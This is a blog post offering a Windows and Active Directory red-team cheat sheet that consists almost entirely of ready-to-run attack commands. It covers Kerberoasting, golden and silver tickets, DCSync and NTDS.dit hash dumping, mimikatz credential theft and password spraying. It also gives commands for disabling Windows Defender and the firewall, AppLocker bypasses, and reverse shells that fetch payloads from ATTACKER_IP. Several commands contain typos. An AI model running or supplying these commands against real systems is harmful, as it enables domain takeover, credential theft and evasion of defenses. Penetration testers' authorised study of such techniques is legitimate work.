---
title: Windows Red Team Cheat Sheet
date: 2022-04-20 12:51:13
tags: ['security','RedTeam']
categories: ['security', 'RedTeam']
---

List of tools and techniques required by the red team.

> The contents of this post have been collected from various books and repositories.

## Reconnaissance

### system information

| Command  | Descriptions |
| -------- | ------------ |
| systeminfo | This tool displays operating system configuration information for a local or remote machine, including service pack levels. |
| hostname | Prints the name of the current host.  |

### Accounts

```bash
net users
net localgroups
net localgroup Administrators
net user <USERNAME>

# Crosscheck local and domain too
net user <USERNAME> /domain
net group Administrators /domain

```

### Network information

```bash
ipconfig /all
route print
arp -A

# Network connections
netstat -ano
```

### Processes And Services

```powershell
# Running processes
tasklist /SVC

sc query state= all | findstr "SERVICE_NAME:" >> a & FOR /F "tokens=2 delims= " %i in (a) DO @echo %i >> b & FOR /F %i in (b) DO @(@echo %i & @echo --------- & @sc qc %i | findstr "BINARY_PATH_NAME" & @echo.) & del a 2>nul & del b 2>nul
```

## Privileges Escalation

### PowerShellMafia

- [github repository](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

```bash
powershell.exe -c "Import-Module C:\Users\Public\PowerUp.ps1; Invoke-AllChecks"
powershell.exe -c "Import-Module C:\Users\Public\Get-System.ps1; Get-System"
```

### Unquoted paths

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v
```

### Juicy Potato
```bash
C:\Windows\Temp\JuicyPotato.exe -p cmd.exe -a "/c whoami > C:\Users\Public\whoami.txt" -t * -l 1031 -c {d20a3293-3341-4ae8-9aaf-8e397cb63c34}
```

### Kerberoast

```bash
# Rubeus 
.\.rubeus.exe kerberoast /creduser:ecorp\VALUE /credpassword:pass1234

# List available tickets
setspn.exe -t evil.corp -q */*
powershell.exe -exec bypass -c "Import-Module .\GetUserSPNs.ps1"
cscript.exe GetUserSPNs.ps1

# List cached tickets
Invoke-Mimikatz -Command '"kerberos::list"'
powershell.exe -c "klist"
powershell.exe -c "Import-Module C:\Users\Public\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command '"kerberos::list"'"

# Request tickets 
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"

# Requesting remotely
python GetUserSPNs.py -request ECORP/VALUE:supersecurepassword@127.0.0.1

# Extract tickets
powershell.exe -c "Import-Module C:\Users\Public\Invoke-Kerberoast.ps1; Invoke-Kerberoast -OutputFormat Hashcat"
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack Tickets
python tgsrepcrack.py /usr/share/wordlists/rockyou.txt ticket.kirbi
```

### Stored Credential
```bash
# To check if there is any stored keyscmdkey /list

# Using them
runas /user:administrator /savecred "cmd.exe /k whoami"
```

### Impersonating Tokens with meterpreter
```bash
use incognito
list_tokens -u
impersonate_token NT-AUTHORITY\System
```

### Tools

| Command  | Descriptions |
| -------- | ------------ |
| [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) | PowerSploit - A PowerShell Post-Exploitation Framework |
| [Sherlock](https://github.com/rasta-mouse/Sherlock) | PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities. |
| [Juicy Potato](https://github.com/ohpe/juicy-potato) | A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM. |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Rubeus is a C# toolset for raw Kerberos interaction and abuses. |
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | mimikatz is a tool I've made to learn C and make somes experiments with Windows security.|

## Lateral Movement

### Mimikatz Ticket PTH

```bash
Enable-PSRemoting
mimikatz.exe '" kerberos:ptt C:\Users\Public\ticketname.kirbi"' "exit"
Enter-PSSession -ComputerName ECORP

Invoke-Mimikatz -Command '"sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:command"'
```

### WinRM

```bash
$pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('ECORP.local\VALUE', $pass)
Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }

# Evil-WinRM
ruby evil-winrm.rb -i 192.168.1.2 -u VALUE -p VALUE -r evil.corp
```

### Tools

| Command  | Descriptions |
| -------- | ------------ |
| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985), of course only if you have credentials and permissions to use it. |

## Database Links

```bash
# PowerUpSQL
https://github.com/NetSPI/PowerUpSQL

Get-SQLServerLink -Instance server -Verbose
powershell.exe -c "Import-Module C:\Users\Public\PowerUpSQL.ps1; Invoke-SQLEscalatePriv -Verbose -Instance ECORP\sql"

# To see servers 
select srvname from master..sysservers;

# Native
Get-SQLServerLinkCrawl -Instance server -Query "exec master..xp_cmdshell 'whoami'"

# Linked database tables
select * from openquery("ECORP\FOO", 'select TABLE_NAME from FOO.INFORMATION_SCHEMA.TABLES') 

# You can also use meterpreter module exploit/windows/mssql/mssql_linkcrawler
# With meterpreter module you can find linked databases and if you are admin on them

# You can do a query and try to enable xp_cmpshell on that server
select * from openquery("server",'select * from master..sysservers') EXECUTE AS USER = 'internal_user' ('sp_configure "xp_cmdshell",1;reconfigure;') AT "server"
```

## Golden and Silver Tickets

```bash
# Golden Ticket
# Extract the hash of the krbtgt user
lsadump::dcsync /domain:evil.corp /user:krbtgt
lsadump::lsa /inject
lsadump:::lsa /patch
lsadump::trust /patch

# creating the ticket 
# /rc4 or /krbtgt - the NTLM hash
# /sid you will get this from krbtgt dump
# /ticket parameter is optional but default is ticket.kirbi
# /groups parameter is optional but default is 513,512,520,518,519
# /id you can fake users and supply valid Administrator id 

kerberos::golden /user:VALUE /domain:evil.corp /sid:domains-sid /krbtgt:krbtgt-hash /ticket:ticket.kirbi /groups:501,502,513,512,520,518,519
kerberos::ptt golden.tck # you can also add /ptt at the kerberos::golden command
# After this , final ticket must be ready

# You can now verify that your ticket is in your cache 
powershell.exe -c "klist"
# Verify that golden ticket is working
dir \\DC\C$
psexec.exe \\DC cmd.exe

# Purge the currently cached kerberos ticket
kerberos::purge 

#metasploit module can also be used for golden ticket, it loads the ticket into given session
post/windows/escalate/golden_ticket 

# Silver Ticket
# Silver Ticket allows escalation of privileges on DC
# /target t he server/computer name where the service is hosted (ex: share.server.local, sql.server.local:1433, ...)
# /service - The service name for the ticket (ex: cifs, rpcss, http, mssql, ...)

# Examples
kerberos::golden /user:VALUE /domain:domain /sid:domain-sid /target:evilcorp-sql102.evilcorp.local.1433 /service:MSSQLSvc /rc4:service-hash /ptt /id:1103
sqlcmd -S evilcorp-sql102.evilcorp.local
select SYSTEM_USER;
GO

kerberos::golden /user:JohnDoe /id:500 /domain:targetdomain.com /sid:S-1-5-21-1234567890-123456789-1234567890 /target:targetserver.targetdomain.com /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt
```

## AD Attacks

### Enumeration
```bash
enum4linux -a 192.168.1.2
python windapsearch.py -u VALUE -p VALUE -d evil.corp --dc-ip 192.168.1.2
python ad-ldap-enum.py -d contoso.com -l 10.0.0.1 -u Administrator -p P@ssw0rd
```

### Bruteforce on ldap
```bash
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt

# Password brute
./kerbrute_linux_amd64 bruteuser -d evil.corp --dc 192.168.1.2 rockyou.txt VALUE

# Username brute
./kerbrute_linux_amd64 userenum -d evil.corp --dc 192.168.1.2 users.txt

# Password spray
./kerbrute_linux_amd64 passwordspray -d evil.corp --dc 192.168.1.2 users.txt rockyou.txt
```

### DC Shadow
```bash
#Find sid for that user
wmic useraccount where (name='administrator' and domain='%userdomain%') get name,sid

#This will create a RPC Server and listen
lsadump::dcshadow /object:"CN=VALUE,OU=Business,OU=Users,OU=ECORP,DC=ECORP,DC=local" /attribute:sidhistory /value:sid

# Run this from another mimikatz
lsadump::dcshadow /push

# After this unregistration must be done
# Relogin

lsadump::dcsync /domain:ECORP.local /account:krbtgt
```

### DC Sync

```bash
#####
lsadump::dcsync /domain:domain /all /csv
lsadump::dcsync /user:krbtgt

#####
https://gist.github.com/monoxgas/9d238accd969550136db
powershell.exe -c "Import-Module .\Invoke-DCSync.ps1; Invoke-DCSync -PWDumpFormat"

#####
python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
python secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit LOCAL
```

### Tools
| Command  | Descriptions |
| -------- | ------------ |
| [enum4linux ](https://github.com/CiscoCXSecurity/enum4linux) | enum4Linux is a Linux alternative to enum.exe for enumerating data from Windows and Samba hosts |
| [windapsearch](https://github.com/ropnop/windapsearch) | Python script to enumerate users, groups and computers from a Windows domain through LDAP queries |
| [ad-ldap-enum](https://github.com/CroweCybersecurity/ad-ldap-enum) | An LDAP based Active Directory user and group enumeration tool |
| [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. |
| [Kerbrute](https://github.com/ropnop/kerbrute) | A tool to perform Kerberos pre-auth bruteforcing |
| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) | Performs various techniques to dump hashes from the remote machine without executing any agent there.|

## Bypass-Evasion Techniques

### Windows Defender

```bash
sc config WinDefend start= disabled
sc stop WinDefend
# Powershell
Set-MpPreference -DisableRealtimeMonitoring $true
# Remove definitions
"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

### Firewall

```bash
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off
```

### Ip Whitelisting

```bash
New-NetFirewallRule -Name VALUEinbound -DisplayName VALUEinbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
```

### Applocker ByPass

- References
  - [Generic AppLocker bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
  - [Verified AppLocker Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md) 
  - [DLL Execution](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)
  
```bash
# Multistep process to bypass applocker via MSBuild.exe:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.56 LPORT=9001  -f csharp -e x86/shikata_ga_nai -i  > out.cs 

# Replace the buf-sc and save it as out.csproj
https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml

Invoke-WebRequest "http://ATTACKER_IP/payload.csproj" -OutFile "out.csproj"; C:\windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe .\out.csproj

# or you can simply use my tool :)
https://github.com/VALUE/Msbuild-payload-generator
sudo python msbuild_gen.py -a x86 -i 10 --lhost 192.168.220.130 --lport 9001 -m
```

### GreatSCT

```bash
# This also needs Veil-Framework
python GreatSCT.py --ip 192.168.1.56 --port 443 -t Bypass -p installutil/powershell/script.py -c "OBFUSCATION=ascii SCRIPT=/root/script.ps1"

C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload1.exe

python3 GreatSCT.py -t Bypass -p regasm/meterpreter/rev_tcp --ip 192.168.1.56 --port 9001
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll
```

### EvilSalsa

```bash
#Preparing payloads
python EncrypterAssembly/encrypterassembly.py EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt
EncrypterAssembly.exe EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt

#Executing payload
SalseoLoader.exe password http://ATTACKER_IP/evilsalsa.dll.txt reversetcp ATTACKER_IP 9001

# Reverse icmp shell
python icmpsh_m.py "ATTACKER_IP" "VICTIM_IP"
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp ATTACKER_IP
```

### Tools
| Command  | Descriptions |
| -------- | ------------ |
| [GreatSCT](https://github.com/GreatSCT/GreatSCT) | The project is called Great SCT (Great Scott). Great SCT is an open source project to generate application white list bypasses. This tool is intended for BOTH red and blue team. |

## Post exploitation

### Reading Event Logs
```bash
et-WinEvent -ListLog *

# Listing logs of a specific user
$cred = Get-Credentials
Get -WinEvent -ListLog * -ComputerName AD1 -Credentials $cred

# Reading Security logs
(Get-WinEvent -FilterHashtable @{LogName = 'Security'} | Select-Object @{name='NewProcessNam
e';expression={ $_.Properties[5].Value }}, @{name='CommandLine';expression={
$_.Properties[8].Value }}).commandline
```

### Password Dump

```bash
# Metasploit
post/windows/gather/enum_chrome
post/multi/gather/firefox_creds
post/firefox/gather/cookies
post/firefox/gather/passwords
post/windows/gather/forensics/browser_history
post/windows/gather/enum_putty_saved_sessions

# Empire
collection/ChromeDump
collection/FoxDump
collection/netripper
credentials/sessiongopher

# mimikatz
privilege::debug
sekurlsa::logonpasswords
```

### Shadow copy
```bash
diskshadow.exe
set context persistent nowriters
add volume C: alias VALUE
create
expose %VALUE% Z:

# Deletion
delete shadows volume %VALUE%
reset
```

### NTDS.dit dump
```bash
secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit -outputfile /tmp/result local

python crackmapexec.py 192.168.1.56 -u VALUE -p pass1234 -d evilcorp.com --ntds drsuapi

# on DC, lsass.exe can dump hashes
lsadump::lsa /inject
```

### Tools
| Command  | Descriptions |
| -------- | ------------ |
| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) | Performs various techniques to dump hashes from the remote machine without executing any agent there. |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) | A swiss army knife for pentesting networks |
